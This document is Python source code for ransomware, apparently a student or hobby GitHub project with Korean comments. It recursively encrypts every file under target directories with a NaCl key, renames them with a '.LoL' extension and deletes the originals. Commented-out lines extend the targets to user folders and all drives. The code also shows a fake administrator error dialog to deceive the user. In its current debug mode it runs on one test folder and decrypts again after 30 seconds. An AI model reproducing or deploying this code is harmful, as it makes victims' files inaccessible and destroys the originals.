import ctypes
import threading, pathlib, nacl.utils, tkinter
import os, sys, nacl.secret
from PIL import Image, ImageDraw, ImageFont
from time import sleep
from tkinter import messagebox
from datetime import datetime

class EnDecryptor:
    def __init__(self, files=0, encryptModule=0):
        self._files=files
        self._encryptModule=encryptModule

    def encryptFile(self):
        try:
            for file in self._files:
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return

                    with open(file, "rb") as File:
                        data=File.read()
                    encryptedFile=self._encryptModule.encrypt(data)
                    with open(f"{file}.LoL", "wb") as File:
                        File.write(encryptedFile)
                    os.remove(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")

    def decryptFile(self):
        try:
            for file in self._files:
                originName=file.strip(".LoL")
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return

                    with open(file, "rb") as File:
                        data=File.read()
                    decryptedFile=self._encryptModule.decrypt(data)
                    with open(originName, "wb") as File:
                        File.write(decryptedFile)
                    os.remove(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.decryptFile(): {e}")
if len(sys.argv)==1:
    print("키를 랜덤하게 생성합니다")
    Key=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
elif len(sys.argv)==2:
    with open(sys.argv[1], 'rb') as File:
        Key=File.read()
EncryptModule=nacl.secret.SecretBox(Key)
MaxThread=120
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()


#PathList=[r"C:\Users\\"]
#for letter in range(97, 123):
#    drive=f"{chr(letter)}:\\"
#    if (pathlib.Path(drive).exists()):
#        PathList.append(drive)
#PathList.remove("c:\\")

PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test"]
#print(f"[DEBUG] PathList: {PathList}")

def changeBackground():
    print("대충 경고메시지를 띄웠다고 치죠")

def recursiveEncrypt(basepath):
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        EnDecryptor(files, EncryptModule).encryptFile()
    for dir in dirs:
        recursiveEncrypt(dir)

def recursiveDecrypt(basepath):
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        EnDecryptor(files, EncryptModule).decryptFile()
    for dir in dirs:
        recursiveDecrypt(dir)

def fakeAlert():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Error", "Try to re-run as administrator")

def saveKey():
    print("현재 키: ", Key)
    with open(f"key_{datetime.now().strftime('%Y-%m-%d %H-%M-%S')}", "wb") as File:
        File.write(Key)

if __name__ == '__main__':
    print("Admin여부", IsAdmin)
    saveKey()#랜덤하게 생성된 키를 wb로 저장
    if(IsAdmin==False):#디버그를 위한 강제실행
        changeBackground()#경고메시지 세팅
        for drive in PathList_DEBUG:#실험 디렉토리
            print("\n==============================================================================")
            print("***암호화가 5초 뒤 진행될 예정입니다. 타겟디렉토리를 마지막으로 확인하세요***\n", drive)
            print("==============================================================================\n")
            sleep(5)#이 강을 건너지 마오
            recursiveEncrypt(drive)#암호화 수행
            print("암호화 완료. 30초 뒤 복호화를 수행합니다")
            sleep(30)
            recursiveDecrypt(drive)#복호화 수행
            print("복호화 완료")
            
    else:
        fakeAlert()
            
                          
                      
